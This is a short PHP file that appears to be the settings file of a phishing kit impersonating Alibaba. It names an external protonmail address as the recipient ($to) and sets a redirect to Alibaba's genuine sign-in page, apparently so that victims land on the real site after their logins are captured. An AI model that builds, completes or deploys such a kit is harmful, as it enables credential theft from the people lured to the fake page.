<?php


$to = "moonshine.jsterre@protonmail.com";

//Redirect-to location?
$location ="https://messages.alibaba.com/?tracelog=hd_signin";

?>